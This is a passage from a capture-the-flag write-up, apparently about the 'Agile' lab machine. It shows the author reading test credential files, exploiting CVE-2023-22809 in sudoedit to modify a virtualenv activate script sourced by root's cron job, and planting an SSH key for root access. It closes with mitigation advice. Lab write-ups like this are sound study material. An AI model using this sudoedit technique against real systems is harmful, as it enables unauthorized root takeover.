```

```json
{
    "SQL_URI": "mysql+pymysql://superpasstester:REDACTED@localhost/superpasstest"
}
```

The second file contained more credentials.

```
edwards@agile:~$ sudoedit -u dev_admin /app/app-testing/tests/functional/creds.txt
```

```
edwards:REDACTED
```

Those credentials were used in the site's integration tests.

```bash
edwards@agile:/app$ cat /app/test_and_update.sh
#!/bin/bash

# update prod with latest from testing constantly assuming tests are passing

echo "Starting test_and_update"
date

# if already running, exit
ps auxww | grep -v "grep" | grep -q "pytest" && exit

echo "Not already running. Starting..."

# start in dev folder
cd /app/app-testing

# system-wide source doesn't seem to happen in cron jobs
source /app/venv/bin/activate

# run tests, exit if failure
pytest -x 2>&1 >/dev/null || exit

# tests good, update prod (flask debug mode will load it instantly)
cp -r superpass /app/app/
echo "Complete!"
```

I used the database credentials to connect to MySQL again. The database was similar to the previous one. It did not contain anything I could use.

I could modify both set of credentials, but this did not seem to be very useful. I found a  [vulnerability in sudoedit](https://www.linkedin.com/pulse/exploiting-sudoedit-security-flaw-cve-2023-22809-/) that allowed editing arbitrary files. I tried to edit various files, but dev_admin was not allowed to edit them.

I saw that they could modify the activate file that was included in the test script. I tried to modify it and add some code to see how it would behave.

I ran this command:

```bash
EDITOR='nano -- /app/venv/bin/activate' sudoedit -u dev_admin /app/config_test.json
```

I added a simple touch command at the beginning of the file to create a file in '/tmp'. After a few seconds, the file was created, and it belonged to root.

```bash
edwards@agile:~$ ls -lt /tmp/
total 36
-rw-r--r-- 1 root   root      0 Apr 16 16:22 pwn
```

Since the script ran as root, I copied my SSH public key in a file in edwards' home folder. Then I modified the script to copy it in root's home by adding these lines to the 'activate' script.

```bash
mkdir /root/.ssh
chmod 700 /root/.ssh
cp /home/edwards/authorized_keys /root/.ssh/
chmod 600 /root/.ssh/authorized_keys
```

I waited a minute to make sure the cron ran. And then tried connecting as root with my SSH key.

```bash
$ ssh root@target
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-60-generic x86_64)

...

root@agile:~# cat root.txt
REDACTED
```

## Mitigation

The first problem with the application was in the CSV download. There was no protection against reading any file on the server. A simple fix would be to make sure that the file was in '/tmp' folder.

```python
def download():
    r = flask.request
    fn = r.args.get('fn')

    # Validate the requested file is in /tmp
    full_name = os.path.join('/tmp/', fn)
    real = os.path.realpath(full_name)
    if not real.startswith('/tmp/'):
        flask.abort(500)

    with open(real, 'rb') as f:
        data = f.read()
    resp = flask.make_response(data)
    resp.headers['Content-Disposition'] = 'attachment; filename=superpass_export.csv'
    resp.mimetype = 'text/csv'
    return resp
```

This is better, but still allows reading any files '/tmp'. We could add a check for the username, but it would be better to generate the file when requested, and send it directly without using a redirection.

The next issues were with the debug mode used in the box. The web application was running with Flask in debug. And Chrome was also running with the debug port opened. The box would have been safer if debug was not used on the server.

The application stored password in clear in the database. Those passwords could not be hashed as they needed to be retrieved, but they should have been encrypted. It would have made reading them a lot harder. But still possible I might have been able to find how the application decrypt them and use that.

The last issue on the box was using a vulnerable version of 'sudoedit'. Anything with 'sudo' is very sensitive and should always be kept up to date to prevent issues.

And root should probably not source files that can be edited by someone else.

```bash
root@agile:/app/app/superpass# crontab -l
SHELL=/bin/bash
BASH_ENV=/etc/bash.bashrc
# m h  dom mon dow   command
#* * * * * curl -sI http://test.superpass.htb | grep -q "HTTP/1.1 200 OK" || service superpass-tests restart
#* * * * * curl -sI http://superpass.htb | grep -q "HTTP/1.1 200 OK" || service superpass restart
* * * * * source /app/venv/bin/activate
...
```